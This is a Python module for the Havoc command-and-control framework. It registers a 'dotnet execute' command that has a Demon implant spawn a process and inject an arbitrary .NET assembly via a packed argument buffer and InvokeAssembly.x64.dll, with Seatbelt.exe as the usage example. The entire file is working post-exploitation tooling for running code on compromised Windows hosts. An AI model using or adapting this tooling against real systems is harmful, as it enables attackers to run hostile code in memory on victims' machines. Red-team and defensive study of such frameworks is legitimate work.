
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addshort(self, short):
        self.buffer += pack("<h", short)
        self.size += 2

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addBytes(self, s, b): 
        fmt = "<L{}s".format(s)
        self.buffer += pack(fmt, s, str(b))
        self.size += calcsize(fmt)

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

def InvokeAssembly(demonID, *param):
    TaskID   : str    = None
    demon    : Demon  = None
    Assembly : str    = None
    packer   = Packer()

    demon  = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable")
    
    if len(param) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return

    Assembly = open(param[1], 'rb').read()

    packer.addstr("DefaultAppDomain")
    packer.addstr("v4.0.30319")
    packer.addstr(Assembly)
    packer.addstr(" " + ''.join(param[2:]))

    arg = packer.getbuffer() 

    demon.DllSpawn( TaskID, ":/binaries/InvokeAssembly.x64.dll", arg )

    return TaskID

RegisterCommand(InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user")
